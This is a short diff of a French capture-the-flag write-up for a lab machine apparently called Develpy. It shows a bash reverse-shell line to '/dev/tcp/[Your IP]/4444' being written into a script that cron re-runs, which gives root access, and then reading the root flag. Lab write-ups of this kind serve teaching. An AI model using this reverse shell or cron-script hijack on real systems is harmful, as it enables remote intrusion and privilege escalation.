@@ -84,3 +84,9 @@ Executer la commande ci-dessous pour établir la connection.
 echo "bash -i >& /dev/tcp/[Your IP]/4444 0>&1" >
 
 ```
+
+Après ça,une fois que le script serras réexécuter par le cron on aurra accès au root.
+
+![](img/Develpy_nc_root.png?raw=true)
+
+>Avec un cat /root/root.txt on a le flag
